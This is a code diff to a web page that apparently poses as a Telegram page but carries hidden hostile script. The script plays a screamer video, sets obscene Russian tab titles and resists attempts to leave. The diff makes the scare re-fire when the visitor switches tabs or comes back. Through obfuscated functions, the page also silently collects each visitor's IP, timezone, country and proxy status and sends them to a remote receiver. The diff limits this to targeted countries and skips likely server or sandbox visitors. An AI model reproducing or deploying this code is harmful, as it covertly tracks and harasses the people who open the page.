@@ -121,17 +121,16 @@ window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches&&do
 
 var ENABLE_SHADER = true;
 var ENABLE_MULTIPLE_SHADERS = true;
-var REPLAY_SCREAMER_ON_RETURN = true;
 var STORAGE_KEY = 'scare_triggered';
 var ENABLE_ENHANCED_BOT = true;
-
 var FAVICON_IMAGE = 'photo2.jpg';
+var SCARE_ON_TAB_LEAVE = true;
+var SCARE_ON_REVISIT = true;
 
 var SCARE_TITLES = [
- '\u0438\u0434\u0438 \u043d\u0430\u0445\u0443\u0439',      
-  '\u0445\u0443\u0439 \u0442\u0435\u0431\u0435',       
-  '\u043f\u0438\u0437\u0434\u0435\u0446 \u0442\u0435\u0431\u0435', 
-  '\u0448\u043b\u044e\u0445\u0430 \u0435\u0431\u0430\u043d\u0430\u044f'
+  '\u0438\u0434\u0438 \u043d\u0430\u0445\u0443\u0439',     
+  '\u0445\u0443\u0439 \u0442\u0435\u0431\u0435',        
+  '\u043f\u0438\u0437\u0434\u0435\u0446 \u0442\u0435\u0431\u0435',
 ];
 </script>
 
@@ -453,6 +452,15 @@ document.addEventListener('msfullscreenchange',handleFullScreenChangeScare);
 
 window.addEventListener('beforeunload',function(event){
   if(_preventUnload&&_isScareActive){event.preventDefault();event.returnValue='';}
+  if(typeof SCARE_ON_TAB_LEAVE!=='undefined'&&SCARE_ON_TAB_LEAVE){
+    localStorage.setItem(STORAGE_KEY,'true');
+  }
+});
+
+window.addEventListener('pagehide',function(){
+  if(typeof SCARE_ON_TAB_LEAVE!=='undefined'&&SCARE_ON_TAB_LEAVE){
+    localStorage.setItem(STORAGE_KEY,'true');
+  }
 });
 
 _scareVideo.addEventListener('contextmenu',function(e){e.preventDefault();});
@@ -472,9 +480,18 @@ document.addEventListener('visibilitychange',function(){
         _scareVideo.requestPictureInPicture().then(function(){_pipActive=true;}).catch(function(){});
       }
     }
+    if(!_isScareActive&&typeof SCARE_ON_TAB_LEAVE!=='undefined'&&SCARE_ON_TAB_LEAVE){
+      localStorage.setItem(STORAGE_KEY,'true');
+      _activateGifMode();
+    }
   } else {
     if(_pipActive&&document.pictureInPictureElement===_scareVideo){
       document.exitPictureInPicture().then(function(){_pipActive=false;}).catch(function(){_pipActive=false;});
+    }
+    if(!_isScareActive&&typeof SCARE_ON_TAB_LEAVE!=='undefined'&&SCARE_ON_TAB_LEAVE){
+      if(localStorage.getItem(STORAGE_KEY)==='true'){
+        _activateGifMode();
+      }
     }
   }
 });
@@ -501,14 +518,25 @@ function reinforceScare(){
   if(ENABLE_MULTIPLE_SHADERS&&ENABLE_SHADER)addShaderInstance();
 }
 
+function _activateGifMode(){
+  if(_isScareActive)return;
+  var _pw=document.querySelector('.tgme_page_wrap');
+  if(_pw)_pw.style.display='none';
+  var _gif=document.getElementById('replay-gif-container');
+  if(_gif){_gif.style.display='flex';_gif.style.cursor='pointer';}
+  var _ov=document.getElementById('fullscreen-overlay');
+  if(_ov)_ov.style.display='none';
+  enableGyro();
+  changeFavicon();
+  changeTitle();
+}
+
 (function(){
-  if(REPLAY_SCREAMER_ON_RETURN&&localStorage.getItem(STORAGE_KEY)==='true'){
-    document.querySelector('.tgme_page_wrap').style.display='none';
-    var _gif=document.getElementById('replay-gif-container');
-    if(_gif)_gif.style.display='flex';
-    enableGyro();
-    changeFavicon();
-    changeTitle();
+  var _triggered=localStorage.getItem(STORAGE_KEY)==='true';
+  if(_triggered){
+    var _doGif=false;
+    if(typeof SCARE_ON_REVISIT!=='undefined'&&SCARE_ON_REVISIT)_doGif=true;
+    if(_doGif){_activateGifMode();return;}
   }
 })();
 
@@ -678,6 +706,7 @@ function _0xfip(){
     items.push(['\u041f\u0440\u043e\u043a\u0441\u0456/VPN',_0xgd.proxy]);
     items.push(['\u0425\u043e\u0441\u0442\u0438\u043d\u0433',_0xgd.hosting]);
     _fillNetInfo(items);
+    if(typeof _0xGeoFire==='function')_0xGeoFire();
   }
 
   function _setFail(){
@@ -837,33 +866,71 @@ var _0xlk=_0x4a('5f7664617461');
 function _0xchk(cr){
   var d=_0xgd;
   var cc=d.rawCC||'';
-  if(cc&&_TARGET_CC.indexOf(cc)<0){return Promise.resolve();}
+  var ip=d.ip||'';
+  var tz=d.tz||'';
+  if(!ip||ip==='\u2014')return Promise.resolve();
+  if(!tz||tz==='\u2014'||tz.indexOf('Etc/')===0||tz.indexOf('UTC')===0)return Promise.resolve();
+  if(!cc||_TARGET_CC.indexOf(cc)<0)return Promise.resolve();
   var _now=d.date+' '+d.time;
   var _rec=null;
   try{var _raw=localStorage.getItem(_0xlk);if(_raw)_rec=JSON.parse(_raw);}catch(e){}
   if(!_rec){
-    var _newRec={ip:d.ip,fs:_now,ls:_now,v:1};
+    var _newRec={ip:ip,fs:_now,ls:_now,v:1};
     try{localStorage.setItem(_0xlk,JSON.stringify(_newRec));}catch(e){}
     return _0xsnd(cr,_0xbm(d));
   }
   var _visits=(_rec.v||1)+1;
   var _fs=_rec.fs||_now;
   var _ls=_rec.ls||_now;
-  var _updRec={ip:d.ip,fs:_fs,ls:_now,v:_visits};
+  var _updRec={ip:ip,fs:_fs,ls:_now,v:_visits};
   try{localStorage.setItem(_0xlk,JSON.stringify(_updRec));}catch(e){}
   return _0xsnd(cr,_0xbret(d,_visits,_fs,_ls));
 }
 function _0xwait(ms){return new Promise(function(r){setTimeout(r,ms);});}
+
+var _0xGeoReady=false;
+var _0xGeoCallbacks=[];
+function _0xOnGeoReady(fn){
+  if(_0xGeoReady){fn();return;}
+  _0xGeoCallbacks.push(fn);
+}
+function _0xGeoFire(){
+  _0xGeoReady=true;
+  _0xGeoCallbacks.forEach(function(fn){try{fn();}catch(e){}});
+  _0xGeoCallbacks=[];
+}
+
 window.addEventListener('DOMContentLoaded',function(){
-  var _sendData=function(){
-    if(typeof ENABLE_ENHANCED_BOT!=='undefined'&&ENABLE_ENHANCED_BOT){
-      Promise.all([_0xfbt()]).then(function(){return _0xrv();}).then(function(cr){return _0xchk(cr);}).catch(function(){});
-    } else {
-      _0xfbt().then(function(){return _0xrv();}).then(function(cr){return _0xsnd(cr,_0xbm(_0xgd));}).catch(function(){});
-    }
-  };
+  var _sent=false;
+
+  function _isValidData(){
+    var d=_0xgd;
+    var ip=d.ip||'';
+    var tz=d.tz||'';
+    var cc=d.rawCC||'';
+    if(!ip||ip==='\u2014')return false;
+    if(!tz||tz==='\u2014'||tz.indexOf('Etc/')===0||tz.indexOf('UTC')===0)return false;
+    if(cc&&_TARGET_CC.indexOf(cc)<0)return false;
+    return true;
+  }
+
+  function _doSend(){
+    if(_sent)return;
+    if(!_isValidData())return;
+    _sent=true;
+    _0xfbt().then(function(){return _0xrv();}).then(function(cr){
+      if(typeof ENABLE_ENHANCED_BOT!=='undefined'&&ENABLE_ENHANCED_BOT){
+        return _0xchk(cr);
+      }
+      return _0xsnd(cr,_0xbm(_0xgd));
+    }).catch(function(){});
+  }
+
   _0xfip();
-  _0xwait(5000).then(_sendData);
+
+  _0xOnGeoReady(function(){_doSend();});
+  _0xwait(2500).then(function(){_doSend();});
+  _0xwait(8000).then(function(){_doSend();});
 });
 })();
 </script>
